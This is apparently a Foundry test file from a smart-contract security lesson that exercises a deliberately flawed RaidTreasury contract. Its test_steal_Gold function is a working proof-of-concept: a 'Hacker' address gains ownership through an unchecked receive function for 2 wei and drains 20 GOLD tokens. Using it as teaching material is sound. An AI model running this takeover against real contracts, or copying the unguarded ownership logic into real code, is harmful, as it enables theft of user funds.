// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test, console } from "forge-std/Test.sol";
import { RaidTreasuryS } from "../../script/Lesson-5/RaidTreasury.s.sol";
import { RaidTreasury } from "../../src/Lesson-5/RaidTreasury.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract RaidTreasuryT is Test {

    RaidTreasury RT;
    ERC20Mock GOLD;

    address Owner = makeAddr("Owner");
    address Hacker = makeAddr("Hacker");

    /*//////////////////////////////////////////////////////////////
                                 setUp
    //////////////////////////////////////////////////////////////*/    

    function setUp() public {
        RaidTreasuryS _RT = new RaidTreasuryS();
        (RT, GOLD) = _RT.run();
    }

    function test_settings() public view {
        assertEq(address(RT.gold()), address(GOLD));
        assertEq(RT.owner(), Owner);
        assertEq(GOLD.balanceOf(address(RT)), 20 ether);
    }

    function test_onlyOwner() public {
        vm.expectRevert(RaidTreasury.CallerIsNotOwner.selector);
        RT.withdraw();
    }

    function test_unchecked_withdraw() public {
        console.log("Owner Gold Balance Before: ", GOLD.balanceOf(Owner)); 

        // 1. First call – expected behavior, transfer succeeds
        vm.prank(Owner);
        RT.withdraw();
        console.log("First Withdraw Hit, Owner balance: ", GOLD.balanceOf(Owner));

        // 2. Second call – no revert, no change in balance (redundant)
        vm.prank(Owner);
        RT.withdraw();
        console.log("Second Withdraw Hit, Owner balance: ", GOLD.balanceOf(Owner));

        // 3. Third call – same as above, still redundant
        vm.prank(Owner);
        RT.withdraw();
        console.log("Third Withdraw Hit, Owner balance: ", GOLD.balanceOf(Owner));        
    }

    function test_can_send_zeroKAIA() public {

        RT.contribute(); // no funds sent
        RT.contribute(); // no funds sent
        RT.contribute(); // no funds sent
        RT.contribute(); // no funds sent

    }

    function test_steal_Gold() public {
        assertEq(GOLD.balanceOf(Hacker), 0);

        vm.deal(Hacker, 100 ether);
        vm.startPrank(Hacker);

        // 1. send a little bit funds
        RT.contribute{value: 1}();

        // 2. send via receive function
        (bool ok, ) = address(RT).call{value: 1}("");
        assert(ok);

        // 3. receive function did not checks the condition before
        //    granding owner, therefore Hacker has become the owner
        assertEq(RT.owner(), Hacker);

        // 4. because Hacker is the owner, he can withdraw the funds
        //    Hacker just got 20 Gold for 2 wei !!!
        RT.withdraw();
        assertEq(GOLD.balanceOf(Hacker), 20 ether);
        assertEq(GOLD.balanceOf(address(RT)), 0 ether);

        vm.stopPrank();

    }

}